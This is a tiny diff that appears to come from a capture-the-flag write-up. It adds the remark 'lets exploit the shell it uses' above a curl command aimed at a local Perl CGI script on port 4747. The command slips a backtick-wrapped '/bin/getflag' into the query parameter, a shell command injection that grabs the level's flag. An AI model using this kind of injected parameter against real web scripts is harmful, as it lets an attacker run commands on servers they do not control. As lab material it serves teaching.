@@ -1,1 +1,3 @@
+There is a Perl file, lets exploit the shell it uses.
+
 curl "http://localhost:4747/level04.pl?x=\`/bin/getflag\`"
